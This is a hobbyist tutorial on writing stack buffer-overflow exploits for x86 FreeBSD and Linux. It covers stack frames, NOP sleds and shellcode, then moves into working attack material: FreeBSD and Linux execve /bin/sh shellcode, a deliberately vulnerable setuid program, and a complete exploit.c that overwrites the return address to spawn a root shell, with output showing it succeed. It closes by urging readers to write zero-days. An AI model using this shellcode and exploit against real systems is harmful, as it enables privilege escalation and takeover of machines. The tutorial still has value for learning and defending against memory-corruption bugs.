
A guide to writing simple buffer-overflow exploits for x86 *nix.

by fides [f1d3s@lineone.net]


This guide intends to teach the basics of buffer overflow to the average C programmer
without the need for complex knowledge of assembly.

During this paper I will be using FreeBSD 4.2-Release to demonstrate procedures.



1.  What is a buffer overflow?
    ==========================


A buffer overflow is a condition in a program whereby a function attempts to copy more
data into a buffer than it can hold.  For example:

char input[] = "aaaaaaaaaaa");
char buffer[10];
strcpy(buffer, input);

This would cause a segmentation fault because we are copying 11 bytes into the buffer
which can only hold 10.  The buffer has been overflowed.

The 'safe' version of the above code would be:

char input[] = "aaaaaaaaaaa");
char buffer[10];
strncpy(buffer, input, sizeof(buffer));

This time it only copies the maximum amount of data that the buffer can handle, so the
buffer can never be overflowed.  Unfortunately, not everybody is this careful when writing
their code, and this is why there is so much vulnerable software these days.



2.  So what happens to the extra byte(s)?
    =====================================


I could get into a lot of detail about the stack here, but I wanted to keep this paper
simple so that the reader can build exploits without having a degree in x86 assembly.

In memory, our buffer (of 10 bytes) looks like this:

   buffer    sfp   ret
[BBBBBBBBBB][xxxx][xxxx]

This is part of a Stack Frame.  Basically, we have 10 bytes of buffer (actually 9 plus a NULL
character to terminate it) then we have a four-byte Stack Frame Pointer and a four-byte Return -
Address.

When a function such as strcpy() is called, a stack frame is allocated for the buffer and
the return address in this stack frame is set to the next instruction AFTER the strcpy() call.

For example:

strcpy(one, two);
printf("String copied.\n");

when strcpy() is called in this code, the return address is set to the address of the next
instruction which will be the assembly equivalent of the printf() call.  This is so that
when strcpy() has finished, the program returns execution at the return address set in the
stack frame.

So lets imagine what would happen if that return address were to somehow be changed.  Instead
of returning back to just after the strcpy() call and continuing execution, the program
would jump to the location in memory specified by the return address.  Lets assume the
program is owned by root (uid 0) and it mode +s (setuid).  If the return address could be
pointed to shellcode (code that will spawn a shell), the user running the program could
get a root shell.  And *that* is what we are aiming for ;)

So lets look at our Stack Frame in memory when we copy 18 bytes into it instead of the 10 that
are allocated by the buffer.  In this example I will assume we strcpy()'d 18 character 'd's into
the buffer.

   buffer    sfp   ret
[dddddddddd][dddd][dddd]

In this example the return address is set to 0x64646464  (0x64 is the ascii value of 'd')

So we can obviously set the return address to pretty much anything we want to really, except
for the use of NULLs.  A string of data is always terminated by a NULL, so if we set the return
address to something like 0x64006464, it would take the NULL as being the end of the string and
the rest of the address would not be copied in.  This also applies to any data we decide to put
into the buffer.


3.  The Stack Pointer
    =================


Every program has a stack pointer which is the address of the beginning of the stack.  We can
find the stack pointer for a system using the following code:


unsigned long sp(void)
{
	__asm__("movl %esp, %eax");
}

void main(void)
{
	printf("0x%x\n", sp());
}


The function sp() contains the assembly instruction movl which copies the value of the stack
pointer to the return buffer for the function, so it is returned to the main function and
displayed.

$ ./sp
0xbfbffbc8
$

Ok, so we know our stack pointer is 0xbfbffbc8.  This means that if we write a program, any
variables we declare will be allocated memory just after this address.  So with a little guesswork
and some luck, we can find the address of a buffer in memory.


4.  Shellcode
    =========


Shellcode is raw code in opcode format that will spawn a shell.  The normal and most common type
of shellcode is a straight /bin/sh execve() call.  This code calls execve() to execute /bin/sh
which obviously spawns a shell.  There are many papers on writing shellcode, so I won't go into
any detail or attempt to teach you to write shellcode.

The three things you *need* to know about shellcode are:

 *  It must not contain any NULL characters.
 *  It should generally be as small as possible.
 *  It is os and architecture dependant.  So FreeBSD x86 shellcode will not work on a Sparc and
    Linux shellcode will not work under *bsd.


Example shellcode:

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
\x89\xe3\x50\x53\x50\x54\x53\xb0\x3b\x50\xcd\x80


This is shellcode for freebsd that execve()'s /bin/sh.

We can test this code using the following program:

char bsdshell[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
                  "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
                  "\xb0\x3b\x50\xcd\x80";

int main() {
	void (*s)()=(void *)bsdshell;   /* create a function pointing to the code */
	s();
}


And as we can see, it works:

fides@brotherhood:~$ gcc -o shell shell.c
fides@brotherhood:~$ ./shell
$ exit
fides@brotherhood:~$

5.  Exploitation
    ============


We will now create a vulnerable program and attempt to exploit it.  Here is our vulnerable
program:


/* vulnerable.c */

int main(int argc, char *argv[])
{
	char buffer[500];
	if(argc>=2) strcpy(buffer, argv[1]);
	return 0;
}


This will allocate a buffer of 500 bytes and copy into it whatever is given as the first
command-line argument.  So we can pass it more than 500 bytes on the command line and overflow
the buffer.

To make this more real, we should set the program suid so that when run the user becomes root.

$ gcc -o vulnerable vulnerable.c
$ su
Password:
# chown 0 vulnerable
# chmod 4755 vulnerable
# exit
$ ./vulnerable hi_there
$

Ok, all is good, the program copies its data and returns with no problem.  Now lets check that 501
bytes is going to overflow it.


/* overflow.c */

void main()
{
	char buffer[501];
	memset(&buffer, 'a', sizeof(buffer));
	execl("./vulnerable", "vulnerable", buffer, 0);
}


$ gcc -o overflow overflow.c
$ ./overflow
Bus error
$


Ok so all is good.  Now we need to actually exploit this vulnerable program to spawn a root shell.

We have a buffer of 500 bytes to play with, so we can put our shellcode somewhere in this, but we
need to be able to jump to it in memory, therefore we must know (roughly) where it is.

Remember what we said before, the stack pointer points to the beginning of the stack so the address
of the buffer must be somewhere soon after it.

But how do we know exactly where to jump?  The answer is we often don't, but the task of trial-and-
error can be made a lot easier by the use of NOPs.

A 'NOP' is instruction \x90 in assembly that simply does nothing for one tick and passes on to the
next instruction.  NOPs are sometimes used in timing to create delays.

How can the NOP be useful to us?  Well we have to jump to the start of our shellcode at its
position in the buffer of the vulnerable program, but we don't know exactly where it is.  But what
if the first 200 bytes of the buffer were NOPs just before the shellcode?  We could jump to any
position in the bank of NOPs and the execution would just run through them in a few microseconds
until it reached the shellcode which would then be executed.  In this way, we only need a very
rough idea of where the buffer is, so we can get the stack pointer (using the function shown
previously) and subtract an offset from it in increments of say 30 or 40 until we hit a NOP
somewhere in the buffer.

So we need to create our own buffer in the exploit code, of 600 bytes.  We fill it with the return
address to make sure our ret address last on the register we want to overwrite.  The first half of the
buffer we will with NOPs with the shellcode in the middle.

We will take an argument from the command line to specify the offset from the stack pointer. (i.e.
guess the address of a NOP in the buffer)


/* exploit.c */

#include <stdlib.h>

#define BUFFERSIZE 600  /* vulnerable buffer + 100 bytes */

/* shellcode for freebsd (*bsd?) */
char bsdshell[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
                  "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
                  "\xb0\x3b\x50\xcd\x80";

/* linux x86 shellcode */
char lunixshell[] = "\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89\x76\x08\xb0"
                    "\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0\x40\xcd"
                    "\x80\xe8\xde\xff\xff\xff/bin/sh";

unsigned long sp(void)
{
	__asm__("movl %esp, %eax");
}

void usage(char *cmd)
{
	printf("\nusage: %s <offset> <os>\n\n", cmd);
	printf("OS types are:  1. FreeBSD (*bsd?)  2. Linux\n\n");
	exit(-1);
}

int main(int argc, char *argv[])
{
	int i, offset, os;
	long esp, ret, *addr_ptr;
	char *buffer, *ptr, *osptr;

	if(argc<3) usage(argv[0]);   /* quit if they didnt specify an offset */

	offset = atoi(argv[1]);  /* get the offset they specified */
	esp    = sp();           /* get the stack pointer */
	ret    = esp-offset;     /* sp - offset = return address */
	os     = atoi(argv[2]);  /* get os */

	if(os<1 || os>2) usage(argv[0]);

	printf("Stack pointer: 0x%x\n", esp);
	printf("       Offset: 0x%x\n", offset);
	printf("  Return addr: 0x%x\n", ret);

	/* allocate memory for our buffer */
	if(!(buffer = malloc(BUFFERSIZE))) {
		printf("Couldn't allocate memory.\n");
		exit(-1);
	}

	/* fill buffer with ret addr's */
	ptr = buffer;
	addr_ptr = (long *)ptr;
	for(i=0; i<BUFFERSIZE; i+=4)
		*(addr_ptr++) = ret;

	/* fill first half of buffer with NOPs */
	for(i=0; i<BUFFERSIZE/2; i++)
		buffer[i] = '\x90';

	/* insert shellcode in the middle */
	if(os == 1) {
		ptr = buffer + ((BUFFERSIZE/2) - (strlen(bsdshell)/2));
		for(i=0; i<strlen(bsdshell); i++)
			*(ptr++) = bsdshell[i];
	} else {
		ptr = buffer + ((BUFFERSIZE/2) - (strlen(lunixshell)/2));
		for(i=0; i<strlen(lunixshell); i++)
			*(ptr++) = lunixshell[i];
	}

	/* call the vulnerable program passing our exploit buffer as the argument */

	buffer[BUFFERSIZE-1] = 0;
	execl("./vulnerable", "vulnerable", buffer, 0);

	return 0;
}


Now we can test our exploit:

$ ./exploit 0 1
Stack pointer: 0xbfbffb90
       Offset: 0x0
  Return addr: 0xbfbffb90
#


Here 0-221 works for the offset because the buffer we are overflowing is the very first variable
declared in vulnerable.c, so it is right at the beginning of the program's stack. (note your os may
be slightly different)


That's it!  Now you can run off and code some m4d 0d4y :p
